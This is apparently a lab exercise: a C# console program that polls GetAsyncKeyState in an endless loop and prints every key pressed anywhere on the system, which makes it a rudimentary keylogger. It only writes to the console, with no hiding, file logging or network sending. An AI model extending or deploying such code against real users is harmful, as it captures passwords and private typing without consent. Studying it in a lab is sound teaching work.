using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lab4task1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            while (true)
            {
                for (int i = 8; i <= 127; i++)
                {
                    Thread.Sleep(1);
                    int State = GetAsyncKeyState(i);
                    if (State != 0)
                    {
                        switch (i)
                        {
                            case 8:
                                Console.WriteLine("[BACKSPACE]");
                                break;
                            case 9:
                                Console.WriteLine("[TAB]");
                                break;
                            case 13:
                                Console.WriteLine("[ENTER]");
                                break;
                            case 16:
                                Console.WriteLine("[SHIFT]");
                                break;
                            case 17:
                                Console.WriteLine("[CTRL]");
                                break;
                            case 18:
                                Console.WriteLine("[Alt]");
                                break;
                            case 20:
                                Console.WriteLine("[Caps Lock]");
                                break;
                            case 27:
                                Console.WriteLine("Escape");
                                break;
                            case 32:
                                Console.WriteLine("[SPACE]");
                                break;
                            case 36:
                                Console.WriteLine("[Home]");
                                break;
                            case 33:
                                Console.WriteLine("[Page Up]");
                                break;
                            case 34:
                                Console.WriteLine("[Page Down]");
                                break;
                            case 45:
                                Console.WriteLine("[Insert]");
                                break;
                            case 46:
                                Console.WriteLine("[DELETE]");
                                break;
                            default:
                                Console.WriteLine(Convert.ToChar(i));
                                break;
                        }
                    }
                }
            }
        }
    }
}

